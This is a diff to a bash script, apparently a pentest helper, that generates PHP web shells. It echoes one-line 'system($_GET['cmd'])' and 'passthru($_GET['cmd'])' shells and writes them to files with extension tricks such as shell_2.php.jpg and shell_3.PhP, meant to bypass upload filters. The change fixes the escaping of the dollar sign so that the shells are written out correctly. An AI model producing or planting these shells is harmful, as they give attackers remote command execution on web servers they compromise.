@@ -273,12 +273,12 @@ fi
 	echo -e "\n "
 	echo -e "\033[33;7m#######################################\e[0m \n \n ";
 	echo -e "This is script php [2] \n "
-	echo  " <?php echo system($_GET['cmd']); ?> "
+	echo  " <?php echo system(\$_GET['cmd']); ?> "
 	echo -e "\n "
 	echo -e "\033[33;7m#######################################\e[0m \n \n ";
 	echo -e  "This is the script php [3] \n "
 
-	echo  " <?php passthru($_GET['cmd']); ?> "
+	echo  " <?php passthru(\$_GET['cmd']); ?> "
 
 
 
@@ -290,45 +290,45 @@ fi
 	echo -e "\n \n ";
 	echo -e "\033[33;7m#######################################\e[0m \n \n ";
 	echo -e "This is the script save by file name [1] $file5 "
-	echo    " <?php echo system($_GET['cmd']); ?> " > $file5
+	echo    " <?php echo system(\$_GET['cmd']); ?> " > $file5
 	chmod +x $file5
 
 	echo -e "\n \n ";
 	echo -e "\033[33;7m#######################################\e[0m \n \n ";
 	echo -e "This is the script save by file name [2] (shell_1.php) \n"
-	echo    " <?php echo system($_GET['cmd']); ?> " > shell_1.php
+	echo    " <?php echo system(\$_GET['cmd']); ?> " > shell_1.php
 	chmod +x shell_1.php
 
 	echo -e "\n \n ";
 	echo -e "\033[33;7m#######################################\e[0m \n \n ";
 	echo -e "This is the script save by file name [3] (shell_2.php.jpg) \n"
-	echo  " <?php echo system($_GET['cmd']); ?> " > shell_2.php.jpg
+	echo  " <?php echo system(\$_GET['cmd']); ?> " > shell_2.php.jpg
 	chmod +x shell_2.php.jpg
 
 
 	echo -e "\n \n ";
 	echo -e "\033[33;7m#######################################\e[0m \n \n ";
 	echo -e "This is the script save by file name [4] (shell_3.PhP) \n"
-	echo  " <?php echo system($_GET['cmd']); ?> " > shell_3.PhP
+	echo  " <?php echo system(\$_GET['cmd']); ?> " > shell_3.PhP
 	chmod +x shell_3.PhP
 
 	echo -e "\n \n ";
 	echo -e "\033[33;7m#######################################\e[0m \n \n ";
 	echo -e "This is the script save by file name [5] (passthru.php) \n"
-	echo 	"<?php passthru($_GET['cmd']); ?>" > passthru.php
+	echo 	"<?php passthru(\$_GET['cmd']); ?>" > passthru.php
 	chmod +x passthru.php
 
 	echo -e "\n \n ";
 	echo -e "\033[33;7m#######################################\e[0m \n \n ";
 	echo -e "This is the script save by file name [6] (passthru_2.php.jpg) \n"
-	echo  " <?php passthru($_GET['cmd']); ?> " >> passthru_2.php.jpg
+	echo  " <?php passthru(\$_GET['cmd']); ?> " >> passthru_2.php.jpg
 	chmod +x  passthru_2.php.jpg
 
 
 	echo -e "\n \n ";
 	echo -e "\033[33;7m#######################################\e[0m \n \n ";
 	echo -e "This is the script [7] passthru_3.PhP \n "
-	echo    "<?php passthru($_GET['cmd']); ?>" >> passthru_3.PhP
+	echo    "<?php passthru(\$_GET['cmd']); ?>" >> passthru_3.PhP
 	chmod +x passthru_3.PhP
 
 	
